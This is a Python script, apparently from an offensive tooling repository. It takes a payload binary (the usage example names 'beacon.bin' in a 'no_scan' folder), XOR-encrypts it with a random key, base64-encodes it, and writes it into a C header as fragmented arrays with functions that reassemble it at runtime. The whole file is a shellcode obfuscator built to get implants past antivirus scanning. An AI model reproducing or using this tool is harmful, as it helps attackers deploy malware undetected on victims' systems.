"""
This code take a binary file as parameter un create the sc.h file that 
contains the binary file xored with an arbitrary key and 
encoded in base64 written as C code.
Use it to store your payload in the .data with XOR encryption section.

Usage: python encryptor_xor.py C:\no_scan\beacon.bin
"""

from base64 import b64encode
import os
import sys
import string
import random
 
key = ''.join(random.choice(string.ascii_letters) for i in range(32))
key = key.encode()  

try:
    file = open(sys.argv[1], 'rb')
    data = file.read()
    file.close()
except IndexError:
    data = shellcode

data += b'\x00\x00\x00\x00'
enc = b''
for i in range(len(data)):
    enc += (data[i] ^ key[i % 32]).to_bytes(1, 'big')

ciphertext = b64encode(enc)

file = open('./sc.h', 'w')
i = 1
k = 0
file.write('#define _CRT_SECURE_NO_WARNINGS\n#pragma once\n#include <string.h>\n\n')
for j in range(len(ciphertext)):
    elt = ciphertext[j]
    if(i%16 == 1):
        if(i//16 % 2 == 0):
            file.write('const char sc_' + format(i//16) + '[16] = {')
        else:
            file.write('char sc_' + format(i//16) + '[16] = {')
        k += 1

    file.write('{}'.format(hex(elt)))

    if(i%16 == 0):
        file.write('};\n')

    elif j != len(ciphertext) - 1:
        file.write(',')
    i += 1

if(i%16 != 1):
    file.write('};\n')

file.write('\nchar sc[{}];\n'.format(len(ciphertext)))
file.write('int sc_length = {};\n'.format(len(ciphertext)))

file.write("void buildsc_0(){\n")
l = 1
m = 1
for i in range(k):
    file.write('\tmemcpy(&sc[{}], sc_{}, 16);\n'.format(i*16, i))
    if(l % 200 == 0):
        file.write("}\nvoid buildsc_" + format(m) + "(){\n")
        m += 1
    l += 1
file.write("}\n")

file.write("void buildsc(){\n")
for i in range(m):
    file.write("\tbuildsc_{}();\n".format(i))
file.write("}")

file.write('\nBYTE key[] = "{}";\n'.format(key.decode()))
file.close()